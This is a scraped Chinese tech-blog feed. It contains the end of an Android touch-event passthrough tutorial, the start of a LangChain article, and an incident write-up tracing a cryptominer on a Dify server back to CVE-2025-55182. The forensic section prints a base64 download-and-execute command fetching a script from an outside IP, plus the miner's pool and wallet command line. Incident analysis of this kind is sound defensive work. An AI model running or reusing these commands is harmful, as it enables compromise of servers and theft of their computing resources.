                    <span class="hljs-keyword">if</span> (!focusTaken) { <span class="hljs-comment">// 如果刚才获取焦点失败（或不需要），才执行点击</span>
                        performClickInternal(); <span class="hljs-comment">// -&gt; OnClickListener.onClick()</span>
                    }
                }
                <span class="hljs-keyword">break</span>;
                
            <span class="hljs-comment">// ... (省略 DOWN/MOVE 处理) ...</span>
        }

        <span class="hljs-comment">// 消费事件</span>
        <span class="hljs-comment">// 只要进入了 if (clickable) 块，最终一定返回 true。</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; 
    }

    <span class="hljs-comment">// 不消费事件 </span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}

</code></pre>
<h3 data-id="heading-4">2.2 重写 onTouchEvent 返回 false</h3>
<p>直接重写 onTouchEvent，返回 false。</p>
<p>注：如果你只在 <code>ACTION_DOWN</code> 返回 false，那么后续的 <code>MOVE</code> 和 <code>UP</code> 事件将不会再分发给这个 View。你只能监听到 DOWN。</p>
<h3 data-id="heading-5">2.3 Window 级别的透传 (悬浮窗/系统层)</h3>
<p>若是 <code>WindowManager</code> 添加的 View。</p>
<pre><code class="hljs language-java" lang="java">WindowManager.<span class="hljs-type">LayoutParams</span> <span class="hljs-variable">params</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WindowManager</span>.LayoutParams();
<span class="hljs-comment">// 关键 Flag：FLAG_NOT_TOUCHABLE</span>
<span class="hljs-comment">// 设置后，事件直接穿透这个 Window，传递给后面的 Window</span>
params.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;

<span class="hljs-comment">// 如果想要自己处理一部分区域，其他区域透传，需配合 FLAG_NOT_TOUCH_MODAL</span>
params.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
</code></pre>
<p>Android 12+ 对非系统应用的触摸事件安全性做了限制（防止 Tapjacking 攻击），设置透明 Window 透传事件时，如果透明度过低或遮挡敏感区域，事件可能会被系统拦截，但在同个 UID 应用内通常不受限。</p>
<h2 data-id="heading-6">3. 实战</h2>
<h3 data-id="heading-7">3.1 透明度陷阱</h3>
<ol>
<li><strong>View.setVisibility(INVISIBLE/GONE)</strong> : View 不参与绘制，且 <code>canReceivePointerEvents()</code> 返回 false，事件<strong>天然透传</strong>。</li>
<li><strong>View.setAlpha(0)</strong> : View 只是全透明，但依然存在于布局中，依然参与事件分发。如果不设 <code>clickable=false</code>，它就是一堵透明墙，会拦截所有事件。</li>
</ol>
<h3 data-id="heading-8">3.2 事件序列断裂</h3>
<p><strong>现象：</strong> 上层 View 想通过 <code>onTouchEvent</code> 监听用户的滑动轨迹（MOVE），同时让下层 View 也能响应点击。于是上层在 DOWN 时返回 <code>false</code>。</p>
<p><strong>结果：</strong> 上层 View 根本收不到 MOVE 和 UP。</p>
<p><strong>解法：</strong> 这种“既要又要”的需求（双层响应），通常不能通过简单的 return false 实现。</p>
<ul>
<li><em>方法 A：</em> 上层拦截事件（return true），自己在 <code>onTouchEvent</code> 里处理完后，<strong>手动</strong>调用下层 View 的 <code>dispatchTouchEvent</code>（这种叫事件注入，比较 Hack）。</li>
<li><em>方法 B：</em> 使用 <code>onInterceptTouchEvent</code>。</li>
</ul>
<h3 data-id="heading-9">3.3 ImageView 透传</h3>
<p>与 Button 不同，<strong>ImageView 默认 <code>android:clickable="false"</code></strong> 。</p>
<p>这意味着，如果你只是在一个 FrameLayout 中把一个 ImageView 盖在 Button 上，不做任何代码设置，点击事件会自动“穿透” ImageView，被底下的 Button 响应。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[我的dify被精准攻击了(CVE-2025-55182)]]></title>    <link>https://juejin.cn/post/7588704463620964371</link>    <guid>https://juejin.cn/post/7588704463620964371</guid>    <pubDate>2025-12-29T07:04:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588704463620964371" data-draft-id="7588570963295322155" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="我的dify被精准攻击了(CVE-2025-55182)"/> <meta itemprop="keywords" content="React.js,人工智能"/> <meta itemprop="datePublished" content="2025-12-29T07:04:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="然麦"/> <meta itemprop="url" content="https://juejin.cn/user/3034307824728605"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            我的dify被精准攻击了(CVE-2025-55182)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3034307824728605/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    然麦
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T07:04:23.000Z" title="Mon Dec 29 2025 07:04:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>记一次 dify 被攻击的例子</p>
</blockquote>
<p>在服务器上部署的 dify 应用，突然不能访问了，还以为 docker 服务挂掉了，登录到机器上，发现 CPU 飙高。</p>
<p><code>top</code> 下查看进程</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">~$</span> <span class="hljs-string">top</span>
    <span class="hljs-string">PID</span> <span class="hljs-string">USER</span>      <span class="hljs-string">PR</span>  <span class="hljs-string">NI</span>    <span class="hljs-string">VIRT</span>    <span class="hljs-string">RES</span>    <span class="hljs-string">SHR</span> <span class="hljs-string">S</span>  <span class="hljs-string">%CPU</span>  <span class="hljs-string">%MEM</span>     <span class="hljs-string">TIME+</span> <span class="hljs-string">COMMAND</span>                                                                               
 <span class="hljs-number">121817</span> <span class="hljs-number">1001      </span><span class="hljs-number">25</span>   <span class="hljs-number">5</span>  <span class="hljs-number">313340</span> <span class="hljs-number">276072</span>   <span class="hljs-number">4224 </span><span class="hljs-string">S</span> <span class="hljs-number">298.7</span>   <span class="hljs-number">3.4</span>  <span class="hljs-number">93</span><span class="hljs-string">:39.70</span> <span class="hljs-string">hash</span>                                                                                  
  <span class="hljs-number">46503</span> <span class="hljs-number">1001      </span><span class="hljs-number">20</span>   <span class="hljs-number">0</span>   <span class="hljs-number">20.</span><span class="hljs-string">8g</span> <span class="hljs-number">242688</span>  <span class="hljs-number">60160</span> <span class="hljs-string">S</span>   <span class="hljs-number">1.7</span>   <span class="hljs-number">3.0</span>   <span class="hljs-number">0</span><span class="hljs-string">:13.67</span> <span class="hljs-string">next-server</span> <span class="hljs-string">(v1</span>                                                                       
    <span class="hljs-number">801</span> <span class="hljs-string">root</span>      <span class="hljs-number">20</span>   <span class="hljs-number">0</span> <span class="hljs-number">2320424</span>  <span class="hljs-number">62520</span>  <span class="hljs-number">35456</span> <span class="hljs-string">S</span>   <span class="hljs-number">0.3</span>   <span class="hljs-number">0.8</span>   <span class="hljs-number">0</span><span class="hljs-string">:31.39</span> <span class="hljs-string">containerd</span>                                                                            
   <span class="hljs-number">1036 </span><span class="hljs-string">root</span>      <span class="hljs-number">20</span>   <span class="hljs-number">0</span> <span class="hljs-number">3488664</span> <span class="hljs-number">101828</span>  <span class="hljs-number">55296</span> <span class="hljs-string">S</span>   <span class="hljs-number">0.3</span>   <span class="hljs-number">1.3</span>   <span class="hljs-number">1</span><span class="hljs-string">:01.56</span> <span class="hljs-string">dockerd</span>                                                                               
  <span class="hljs-number">45932</span> <span class="hljs-string">dnsmasq</span>   <span class="hljs-number">20</span>   <span class="hljs-number">0</span>   <span class="hljs-number">34040</span>  <span class="hljs-number">11688</span>   <span class="hljs-number">4864 </span><span class="hljs-string">S</span>   <span class="hljs-number">0.3</span>   <span class="hljs-number">0.1</span>   <span class="hljs-number">0</span><span class="hljs-string">:10.21</span> <span class="hljs-string">redis-server</span>                                                                          
  <span class="hljs-number">47163</span> <span class="hljs-string">root</span>      <span class="hljs-number">20</span>   <span class="hljs-number">0</span> <span class="hljs-number">1417724</span> <span class="hljs-number">527424</span>  <span class="hljs-number">95488</span> <span class="hljs-string">S</span>   <span class="hljs-number">0.3</span>   <span class="hljs-number">6.5</span>   <span class="hljs-number">0</span><span class="hljs-string">:22.60</span> <span class="hljs-string">celery</span>                                                                                
  <span class="hljs-number">47273</span> <span class="hljs-string">root</span>      <span class="hljs-number">20</span>   <span class="hljs-number">0</span> <span class="hljs-number">1287992</span>  <span class="hljs-number">72712</span>  <span class="hljs-number">39808</span> <span class="hljs-string">S</span>   <span class="hljs-number">0.3</span>   <span class="hljs-number">0.9</span>   <span class="hljs-number">0</span><span class="hljs-string">:10.38</span> <span class="hljs-string">main</span>                                                                                  
  <span class="hljs-number">47696</span> <span class="hljs-string">root</span>      <span class="hljs-number">20</span>   <span class="hljs-number">0</span>  <span class="hljs-number">152308</span>  <span class="hljs-number">66796</span>  <span class="hljs-number">19584</span> <span class="hljs-string">S</span>   <span class="hljs-number">0.3</span>   <span class="hljs-number">0.8</span>   <span class="hljs-number">0</span><span class="hljs-string">:02.71</span> <span class="hljs-string">python</span>                                                                                
 <span class="hljs-number">228331</span> <span class="hljs-string">root</span>      <span class="hljs-number">20</span>   <span class="hljs-number">0</span>   <span class="hljs-number">14084</span>   <span class="hljs-number">7532   </span><span class="hljs-number">6144 </span><span class="hljs-string">S</span>   <span class="hljs-number">0.3</span>   <span class="hljs-number">0.1</span>   <span class="hljs-number">0</span><span class="hljs-string">:00.01</span> <span class="hljs-string">sshd</span>
 <span class="hljs-string">...</span>
</code></pre>
<p>除了 <code>hash</code>进程 CPU 飙高以外，还有2 个进程 <code>xmrig</code>和 <code>javs</code>, 启动进程的用户是 <code>1001</code>，用 AI 查一下对应进程是什么</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed91cade4e8b40cf9f0fa893593bfed4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54S26bqm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596663&amp;x-signature=rLFoYHBw5ANKPdARcikzIwphf2Q%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5118395218624830bca99aa2d74aad2b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54S26bqm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596663&amp;x-signature=hUyhOi9csQP5LXUGRBrRD9qKnAc%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82788b6dfa5d48f2b33ccf61172ace63~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54S26bqm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596663&amp;x-signature=HNpGl%2BnLSMEMYwaWvfXSU1bWSoQ%3D" alt="" loading="lazy"/></p>
<p>知道是挖矿进程后，我们查询一下，是哪个用户哪个进程启动的挖矿程序， 先查看登录的用户</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">~$</span> <span class="hljs-string">w</span>
 <span class="hljs-number">17</span><span class="hljs-string">:47:47</span> <span class="hljs-string">up</span>  <span class="hljs-number">7</span><span class="hljs-string">:58,</span>  <span class="hljs-number">2</span> <span class="hljs-string">users,</span>  <span class="hljs-attr">load average:</span> <span class="hljs-number">4.60</span><span class="hljs-string">,</span> <span class="hljs-number">5.81</span><span class="hljs-string">,</span> <span class="hljs-number">6.00</span>
<span class="hljs-string">USER</span>     <span class="hljs-string">TTY</span>      <span class="hljs-string">FROM</span>      <span class="hljs-string">LOGIN@</span>   <span class="hljs-string">IDLE</span>   <span class="hljs-string">JCPU</span>   <span class="hljs-string">PCPU</span> <span class="hljs-string">WHAT</span>
<span class="hljs-attr">admin             xxxx      13:42    7:58m  0.00s  0.03s sshd:</span> <span class="hljs-string">admin</span> [<span class="hljs-string">priv</span>]
<span class="hljs-attr">admin             xxxx      17:46    7:58m  0.00s  0.06s sshd:</span> <span class="hljs-string">admin</span> [<span class="hljs-string">priv</span>]
</code></pre>
<p>根据当前<code>hash</code>进程，根据进程调用链查看是哪个进程启动的服务</p>
<pre><code class="hljs language-bash" lang="bash">~$ ps -ef | grep 121817
1001      121817  121797 99 16:44 ?        01:42:14 ./hash -o auto.c3pool.org:13333 -u 45vWwParN9pJSmRVEd57jH5my5N7Py6Lsi3GqTg3wm8XReVLEietnSLWUSXayo5LdAW2objP4ubjiWTM7vk4JiYm4j3Aozd -p miner_1765529082 --randomx-1gb-pages --cpu-priority=0 --cpu-max-threads-hint=80
admin     231920  227367  0 17:50 pts/0    00:00:00 grep 121817

~$ <span class="hljs-built_in">which</span> <span class="hljs-built_in">hash</span>
~$ ps -ef | grep 121797
1001      121797  121794  0 16:44 ?        00:00:00 sh
1001      121817  121797 99 16:44 ?        01:44:04 ./hash -o auto.c3pool.org:13333 -u 45vWwParN9pJSmRVEd57jH5my5N7Py6Lsi3GqTg3wm8XReVLEietnSLWUSXayo5LdAW2objP4ubjiWTM7vk4JiYm4j3Aozd -p miner_1765529082 --randomx-1gb-pages --cpu-priority=0 --cpu-max-threads-hint=80
admin     232754  227367  0 17:50 pts/0    00:00:00 grep 121797

admin@iv-ye5glxdekgbw80bzfw6v:~$ ps -ef | grep 121794
1001      121794   46468  0 16:44 ?        00:00:00 /bin/sh -c <span class="hljs-built_in">echo</span> d2dldCAtTyAvdG1wLzEyMzQ2LnNoIGh0dHA6Ly80NS4xNTYuMjQuMTY4LzEyMzQ2LnNoJiZzaCAvdG1wLzEyMzQ2LnNo|<span class="hljs-built_in">base64</span> -d|sh
1001      121797  121794  0 16:44 ?        00:00:00 sh
admin     233044  227367  0 17:50 pts/0    00:00:00 grep 121794

<span class="hljs-comment"># 挖矿脚本从这个机器上下载，并允许</span>
~$ <span class="hljs-built_in">echo</span> d2dldCAtTyAvdG1wLzEyMzQ2LnNoIGh0dHA6Ly80NS4xNTYuMjQuMTY4LzEyMzQ2LnNoJiZzaCAvdG1wLzEyMzQ2LnNo|<span class="hljs-built_in">base64</span> -d
wget -O /tmp/12346.sh http://45.156.24.168/12346.sh&amp;&amp;sh /tmp/12346.sh

~$ ps -ef | grep 46468
1001       46468   46102  0 16:08 ?        00:00:11 next-server (v15.5.0)
1001      121794   46468  0 16:44 ?        00:00:00 /bin/sh -c <span class="hljs-built_in">echo</span> d2dldCAtTyAvdG1wLzEyMzQ2LnNoIGh0dHA6Ly80NS4xNTYuMjQuMTY4LzEyMzQ2LnNoJiZzaCAvdG1wLzEyMzQ2LnNo|<span class="hljs-built_in">base64</span> -d|sh
admin     235810  227367  0 17:53 pts/0    00:00:00 grep 46468

~$ ps -ef | grep 46102
1001       46102   45930  0 16:08 ?        00:00:02 node /pnpm/global/5/.pnpm/pm2@6.0.13/node_modules/pm2/bin/pm2 start /app/web/server.js --name dify-web --cwd /app/web -i 2 --no-daemon
1001       46468   46102  0 16:08 ?        00:00:11 next-server (v15.5.0)
1001       46503   46102  0 16:08 ?        00:00:14 next-server (v15.5.0)
admin     236034  227367  0 17:53 pts/0    00:00:00 grep 46102

~$ ps -ef | grep 45930
1001       45930   45791  0 16:08 ?        00:00:00 /bin/sh ./entrypoint.sh
1001       46102   45930  0 16:08 ?        00:00:02 node /pnpm/global/5/.pnpm/pm2@6.0.13/node_modules/pm2/bin/pm2 start /app/web/server.js --name dify-web --cwd /app/web -i 2 --no-daemon
admin     236659  227367  0 17:53 pts/0    00:00:00 grep 45930

<span class="hljs-comment"># 定位到 docker 容器中的服务</span>
~$ ps -ef | grep 45791
root       45791       1  0 16:08 ?        00:00:01 /usr/bin/containerd-shim-runc-v2 -namespace moby -<span class="hljs-built_in">id</span> 46fac5019c67de63335c8eceb5ba13aae000783676f486f4d5bdeefb18ddcfc0 -address /run/containerd/containerd.sock
1001       45930   45791  0 16:08 ?        00:00:00 /bin/sh ./entrypoint.sh
admin     237662  227367  0 17:54 pts/0    00:00:00 grep 45791

<span class="hljs-comment"># 根据容器的 id 查看是哪个容器</span>
~$ docker ps | grep 46fac5
46fac5019c67   langgenius/dify-web:1.9.1                   <span class="hljs-string">"/bin/sh ./entrypoin…"</span>   2 hours ago   Up 2 hours             3000/tcp                                                                       docker-web-1

<span class="hljs-comment"># 原来是 dify-web 启动的挖矿进程</span>
</code></pre>
<p>也可以简单一点，用<code>pstree</code>查看调用链路</p>
<pre><code class="hljs language-scss" lang="scss">~$ pstree -<span class="hljs-selector-tag">p</span>  | grep hash
           |<span class="hljs-built_in">-containerd-shim</span>(<span class="hljs-number">45791</span>)-+<span class="hljs-built_in">-sh</span>(<span class="hljs-number">45930</span>)<span class="hljs-built_in">---node</span>(<span class="hljs-number">46102</span>)-+-next-server (v1(<span class="hljs-number">46468</span>)-+<span class="hljs-built_in">-sh</span>(<span class="hljs-number">121794</span>)<span class="hljs-built_in">---sh</span>(<span class="hljs-number">121797</span>)<span class="hljs-built_in">---hash</span>(<span class="hljs-number">121817</span>)-+-{+
</code></pre>
<p>难道 dify-web 包含挖矿进程，是下载的扩展插件引入的吗？继续问一下 AI</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0d4d56e8005434bbbf447b5948faf7a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54S26bqm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596663&amp;x-signature=xdZMB4zNgz71foWM7ZxRyreoaAY%3D" alt="" loading="lazy"/></p>
<p>哦，那查一下 dify 的 issues 是否有 <code>CVE-2025-55182</code>漏洞，</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6289b0ae858947768a97de30128391d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54S26bqm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596663&amp;x-signature=48gDvJmRGcp0kpTJu2Apq4ioBZY%3D" alt="" loading="lazy"/></p>
<p>查看官方的解决方法，升级 dify 到版本 <code>1.10.2</code>以上，问题即可解决。</p>
<p>为什么 dify 机器被盯上了，攻击者看上 dify 机器上的高配置显卡了，挖矿利器....</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[别再把大模型只当聊天机器人：LangChain Tool 才是 AI 应用的分水岭]]></title>    <link>https://juejin.cn/post/7588917508205183026</link>    <guid>https://juejin.cn/post/7588917508205183026</guid>    <pubDate>2025-12-29T07:16:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588917508205183026" data-draft-id="7588733783572578342" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="别再把大模型只当聊天机器人：LangChain Tool 才是 AI 应用的分水岭"/> <meta itemprop="keywords" content="LangChain"/> <meta itemprop="datePublished" content="2025-12-29T07:16:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="白兰地空瓶"/> <meta itemprop="url" content="https://juejin.cn/user/191753514127514"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            别再把大模型只当聊天机器人：LangChain Tool 才是 AI 应用的分水岭
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/191753514127514/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    白兰地空瓶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T07:16:48.000Z" title="Mon Dec 29 2025 07:16:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body 